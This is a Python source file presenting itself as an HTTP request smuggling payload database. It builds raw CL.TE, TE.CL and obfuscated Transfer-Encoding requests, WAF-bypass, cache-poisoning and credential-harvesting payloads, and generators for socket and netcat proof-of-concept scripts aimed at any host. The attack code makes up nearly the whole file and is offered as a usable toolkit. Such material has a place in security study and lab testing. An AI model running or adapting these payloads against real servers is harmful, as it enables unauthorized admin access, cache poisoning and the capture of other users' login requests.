"""
HTTP Request Smuggling Payload Database
Project #35: HTTP Request Smuggling & Desync Attacks
"""

# ==================================================================== #
# 1. SMUGGLING TECHNIQUE PAYLOADS
# ==================================================================== #
# Each entry: raw bytes to send over a socket.
# The names follow PortSwigger / James Kettle conventions.

def cl_te(target_path='/', smuggled='GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'):
    """
    CL.TE — Frontend uses Content-Length, backend uses Transfer-Encoding.
    Frontend sees Content-Length=6 ("0\r\n\r\n" + padding)
    Backend sees Transfer-Encoding: chunked with a trailing smuggled request.
    """
    body = "0\r\n\r\n" + smuggled
    request = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    return request.encode()

def te_cl(target_path='/', smuggled='GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'):
    """
    TE.CL — Frontend uses Transfer-Encoding, backend uses Content-Length.
    Frontend sees chunked body of 4 bytes; backend sees Content-Length=4
    and treats the rest as the next request.
    """
    chunk_size = len(smuggled)
    body = f"{chunk_size:x}\r\n{smuggled}\r\n0\r\n\r\n"
    request = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    return request.encode()

def te_te_obfuscated(target_path='/', smuggled='GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'):
    """
    TE.TE — Transfer-Encoding obfuscation. One server ignores an
    obfuscated header variant, the other honors it.
    """
    body = "0\r\n\r\n" + smuggled
    request = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-Encoding: identity\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    return request.encode()

def te_space(target_path='/', smuggled='GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'):
    """TE with leading space before 'chunked'"""
    body = "0\r\n\r\n" + smuggled
    request = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding:  chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    return request.encode()

def te_xchunked(target_path='/', smuggled='GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'):
    """TE with 'xchunked' variant (invalid, some parsers ignore)"""
    body = "0\r\n\r\n" + smuggled
    request = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: xchunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    )
    return request.encode()

def cl_te_double(target_path='/', smuggled='GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'):
    """Two Content-Length headers with different values"""
    body = "0\r\n\r\n" + smuggled
    request = (
        f"POST {target_path} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Content-Length: 4\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    )
    return request.encode()

SMUGGLING_TECHNIQUES = {
    'cl_te':            cl_te,
    'te_cl':            te_cl,
    'te_te_obfuscated': te_te_obfuscated,
    'te_space':         te_space,
    'te_xchunked':      te_xchunked,
    'cl_te_double':     cl_te_double,
}

# ==================================================================== #
# 2. DESYNC PAYLOADS
# ==================================================================== #
# Desync = trick the frontend into thinking the request is done,
# but the backend still has data queued for the next request.

DESYNC_PREFIX = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
DESYNC_SUFFIX = "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"

# ==================================================================== #
# 3. WAF BYPASS VIA SMUGGLING
# ==================================================================== #
WAF_BYPASS_PAYLOAD = (
    "POST / HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Length: 44\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "\r\n"
)

# ==================================================================== #
# 4. CACHE POISONING VIA SMUGGLING
# ==================================================================== #
CACHE_POISON_PAYLOAD = (
    "POST / HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Length: 120\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET / HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "X-Forwarded-Host: evil.example.com\r\n"
    "\r\n"
)

# ==================================================================== #
# 5. CREDENTIAL HARVESTING
# ==================================================================== #
# Smuggle a request that makes the backend treat the NEXT user's
# request as the body of this request.
CRED_HARVEST_PAYLOAD = (
    "POST /login HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Length: 100\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "POST /log HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Length: 200\r\n"
    "\r\n"
)

# ==================================================================== #
# 6. DETECTION SIGNATURES
# ==================================================================== #
RESPONSE_SIGNATURES = {
    'timeout':          r'timed out|timeout',
    'bad_request':      r'Bad Request|400 Bad',
    'smuggling_error':  r'Unrecognized|Invalid chunk|Malformed',
    'admin_access':     r'ADMIN|Admin panel|dashboard',
    'xxs_reflected':    r'evil\.example\.com',
    'duplicate_cl':     r'Content-Length.*Content-Length',
    'transfer_enc':     r'Transfer-Encoding',
}

# ==================================================================== #
# 7. POC GENERATOR
# ==================================================================== #
def python_poc(host, port, technique, target_path='/', smuggled='GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n'):
    """Generate a Python PoC using raw sockets."""
    return f'''#!/usr/bin/env python3
"""
PoC: HTTP Request Smuggling ({technique})
Auto-generated by smuggling_toolkit.py
"""
import socket

HOST = "{host}"
PORT = {port}
TARGET_PATH = "{target_path}"
SMUGGLED = "{smuggled.replace(chr(13), chr(92)+'r').replace(chr(10), chr(92)+'n')}"

def build_payload():
    """Send the smuggling payload."""
    # Customize based on technique
    body = "0\\r\\n\\r\\n" + SMUGGLED
    request = (
        f"POST {{TARGET_PATH}} HTTP/1.1\\r\\n"
        f"Host: {{HOST}}\\r\\n"
        f"Content-Length: {{len(body)}}\\r\\n"
        f"Transfer-Encoding: chunked\\r\\n"
        f"Connection: keep-alive\\r\\n"
        f"\\r\\n"
        f"{{body}}"
    )
    return request.encode()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((HOST, PORT))

    payload = build_payload()
    s.sendall(payload)

    try:
        response = s.recv(8192)
        print(response.decode('utf-8', errors='ignore')[:500])
    except socket.timeout:
        print("[!] Timeout — possible smuggling vulnerability")

    s.close()

if __name__ == "__main__":
    main()
'''

def curl_poc(host, port, technique):
    """Generate a bash PoC using printf + nc."""
    return f'''#!/bin/bash
# PoC: HTTP Request Smuggling ({technique})
# Uses printf to send raw bytes via nc

HOST="{host}"
PORT="{port}"

printf 'POST / HTTP/1.1\\r\\n'\\
'Host: %s\\r\\n'\\
'Content-Length: 13\\r\\n'\\
'Transfer-Encoding: chunked\\r\\n'\\
'Connection: keep-alive\\r\\n'\\
'\\r\\n'\\
'0\\r\\n'\\
'\\r\\n'\\
'GET /admin HTTP/1.1\\r\\n'\\
'Host: %s\\r\\n'\\
'\\r\\n' "$HOST" "$HOST" | nc -w 5 "$HOST" "$PORT"

echo ""
echo "[*] If the response contains admin content, smuggling worked"
'''